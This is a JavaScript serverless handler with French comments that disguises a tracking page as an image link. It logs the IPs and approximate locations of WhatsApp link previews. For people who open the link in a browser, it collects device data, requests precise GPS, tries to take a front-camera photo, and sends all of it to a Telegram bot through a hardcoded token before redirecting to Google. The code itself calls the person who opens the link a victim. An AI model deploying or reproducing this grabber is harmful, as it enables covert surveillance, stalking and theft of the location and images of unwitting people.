// api/image.js - Pour Vercel
export default async function handler(req, res) {
    const TOKEN = '8277181218:AAH3uxboStz27mIcuTB5OZWyqfIX5A0K7Io';
    const CHAT_ID = '6815008409';
    
    const ua = req.headers['user-agent'] || '';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Détecter si c'est WhatsApp qui charge l'aperçu
    const isWhatsApp = ua.includes('WhatsApp');
    
    if (isWhatsApp) {
        // === WHATSAPP CHARGE L'APERÇU ===
        // Capturer IP + infos basiques
        let geoData = {};
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode,city,lat,lon,isp`);
            geoData = await geoRes.json();
        } catch(e) {}
        
        const drapeau = geoData.countryCode || '🌍';
        const message = 
            `${drapeau} <b>WHATSAPP APERÇU</b>\n` +
            `🌐 <b>IP:</b> ${ip}\n` +
            `📍 <b>Pays:</b> ${geoData.country || 'Inconnu'}\n` +
            `🏙️ <b>Ville:</b> ${geoData.city || 'Inconnu'}\n` +
            `📡 <b>ISP:</b> ${geoData.isp || 'Inconnu'}\n` +
            `🗺️ <b>GPS approx:</b> ${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}\n` +
            `🕐 <code>${new Date().toLocaleString('fr-FR')}</code>`;
        
        // Envoyer à Telegram
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
        }).catch(() => {});
        
        // Renvoyer une VRAIE image PNG (pixel transparent)
        const pixel = Buffer.from(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwAEhQGAhX8n5gAAAABJRU5ErkJggg==',
            'base64'
        );
        res.setHeader('Content-Type', 'image/png');
        res.setHeader('Content-Length', pixel.length);
        return res.send(pixel);
        
    } else {
        // === LA VICTIME A OUVERT L'IMAGE (NAVIGATEUR) ===
        // On sert une page HTML qui capture tout
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image</title>
<style>
body { margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; }
img { max-width:100%; height:auto; }
.loading { color:#fff; font-family:Arial; text-align:center; }
</style>
</head>
<body>
<div class="loading">
<p style="color:#fff;">Chargement...</p>
</div>
<img id="img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwAEhQGAhX8n5gAAAABJRU5ErkJggg==" style="display:none;">

<script>
var TOKEN = '${TOKEN}';
var CHAT_ID = '${CHAT_ID}';
var IP = '${ip}';

// === COLLECTE COMPLÈTE ===
var captureData = {
    ip: IP,
    ua: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenSize: screen.width + 'x' + screen.height,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory || 'N/A',
    online: navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    connection: navigator.connection ? {
        type: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink
    } : 'N/A'
};

// Envoyer infos de base
var msg = '🖼️ <b>IMAGE OUVERTE - CAPTURE</b>\\n\\n';
msg += '🌐 <b>IP:</b> ' + captureData.ip + '\\n';
msg += '📱 <b>Plateforme:</b> ' + captureData.platform + '\\n';
msg += '🖥️ <b>Écran:</b> ' + captureData.screenSize + '\\n';
msg += '💾 <b>RAM:</b> ' + captureData.memory + ' GB\\n';
msg += '🌍 <b>Fuseau:</b> ' + captureData.timezone + '\\n';
msg += '📶 <b>Réseau:</b> ' + (captureData.connection.type || 'N/A') + '\\n';
msg += '\\n<code>' + new Date().toLocaleString() + '</code>';

fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
});

// === GPS ===
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        var gpsMsg = '📍 <b>GPS PRÉCIS</b>\\n';
        gpsMsg += 'Lat: ' + pos.coords.latitude.toFixed(6) + '\\n';
        gpsMsg += 'Lon: ' + pos.coords.longitude.toFixed(6) + '\\n';
        gpsMsg += 'Précision: ±' + pos.coords.accuracy.toFixed(0) + 'm\\n';
        if (pos.coords.altitude) gpsMsg += 'Altitude: ' + pos.coords.altitude.toFixed(0) + 'm';
        
        fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: gpsMsg, parse_mode: 'HTML'})
        });
    }, function(){}, {enableHighAccuracy: true, timeout: 5000});
}

// === PHOTO (si caméra disponible) ===
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}}).then(function(stream) {
        var video = document.createElement('video');
        video.setAttribute('playsinline', true);
        video.srcObject = stream;
        video.play();
        
        setTimeout(function() {
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(function(blob) {
                var formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', '📸 Photo automatique');
                
                fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.8);
        }, 1000);
    }).catch(function(){});
}

// Redirection après capture
setTimeout(function() {
    window.location.href = 'https://www.google.com';
}, 3000);
</script>
</body>
</html>`;
        
        res.setHeader('Content-Type', 'text/html');
        return res.send(html);
    }
}
